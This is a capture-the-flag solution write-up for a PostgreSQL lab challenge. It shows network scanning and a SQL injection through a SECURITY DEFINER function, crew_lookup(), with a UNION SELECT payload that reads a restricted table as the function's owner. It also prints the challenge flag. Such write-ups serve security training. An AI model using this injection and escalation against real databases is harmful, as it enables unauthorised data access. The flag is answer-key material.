# DB Challenge 2 - Trust the Owner, Not the Caller

**Category:** Forensics
**Difficulty:** Hard
**Author:** Lt. Rico Kopernicus

## Description

The kiosk's "Crew Roster Lookup" widget has been showing "service temporarily degraded".
Figure out what happened and see if it gives us another way into the database.

## Flag

`flag{w4rd3ns_m4st3r_k3y}`

The flag is a `SECURITY DEFINER` privilege-escalation bug: a self-service
lookup function, `crew_lookup()`, is owned by an application role
(`icarus_app`) with reach `guest` doesn't have, but the function builds its
query with plain string concatenation instead of parameter binding. Injecting
through it runs arbitrary `SELECT`s as `icarus_app`, reaching a table `guest`
was never granted.

## Solution

1. Connect to `Icarus_Bridge` and land on `192.168.1.0/24` as in the prior
   challenges.
   ```bash
   wpa_supplicant -B -i wlan0 -c /home/rh/connection.conf
   dhclient wlan0
   ```
2. Re-scan the subnet - same hosts as before: Postgres at the static
   `192.168.1.11`, kiosk terminals in the dynamic `.100`-`.200` range.
   ```bash
   nmap -sV 192.168.1.0/24
   ```
3. Re-browse kiosk1. The runbook has a new entry since the last challenge:
   ```bash
   curl http://192.168.1.X/help.html
   curl http://192.168.1.X/kiosk-runbook.txt
   ```
   Runbook item 6 names the mechanism directly:
   > "Roster search was moved behind a single self-service database function
   > (`crew_lookup`) instead of a direct table grant, so kiosk sessions don't
   > need broad SELECT access just to look up a callsign."
4. Connect as `guest` (still no password - trust auth, unchanged from
   Challenge 1).
   ```bash
   psql -h 192.168.1.11 -U guest -d icarus_core
   ```
5. Enumerate the function. `\df+` shows it's `SECURITY DEFINER`, and the
   catalog confirms it - schema/function metadata isn't privilege-gated even
   when the objects behind it are:
   ```sql
   \df+ crew_lookup
   SELECT proname, prosecdef FROM pg_proc WHERE proname = 'crew_lookup';
   -- prosecdef = t
   \dt
   -- command_overrides is listed, but:
   SELECT * FROM command_overrides;
   -- ERROR: permission denied for table command_overrides
   \d command_overrides
   -- columns visible even though SELECT is denied: code_name, override_code,
   -- note, priority - describe/list operations read pg_catalog, which is
   -- world-readable by default; they are not gated by table-level grants.
   ```
6. Read the function's actual source - `pg_proc.prosrc` is also world-readable
   by default, so `EXECUTE`-only access doesn't hide the function body:
   ```sql
   \sf crew_lookup
   ```
   This shows exactly how `v_sql` is assembled - three `ILIKE '%...%'`
   branches built with `||` string concatenation around the raw `p_query`
   argument, no escaping, then `RETURN QUERY EXECUTE v_sql`. That's the
   whole vulnerability, laid out directly: no guessing the query shape or
   column count is required, because the exact template and the exact
   target-table columns (from step 5) are both readable in advance.
7. Confirm the function's legitimate behavior first:
   ```sql
   SELECT * FROM crew_lookup('WARDEN');
   ```
8. Using the source read in step 6, close the quoted `ILIKE` pattern, `UNION`
   in a query against `command_overrides` (its columns line up exactly with
   the return type from step 5/6: `text, text, text, int`), then rely on the
   trailing `--` to comment out the rest of the concatenated template (the
   whole built statement is one line with no embedded newline, so the
   comment runs to the end of it):
   ```sql
   SELECT * FROM crew_lookup('zzz'' UNION SELECT code_name, override_code, note, priority FROM command_overrides -- ');
   ```
   Because `crew_lookup()` is `SECURITY DEFINER`, this whole statement runs as
   its owner, `icarus_app` - which does have `SELECT` on `command_overrides` -
   not as `guest`.
9. Read the flag off the `bridge.master_override` row:
   ```
   flag{w4rd3ns_m4st3r_k3y}
   ```

## Techniques / Tags

`postgres`, `database`, `sql-injection`, `privilege-escalation`, `security-definer`, `web`
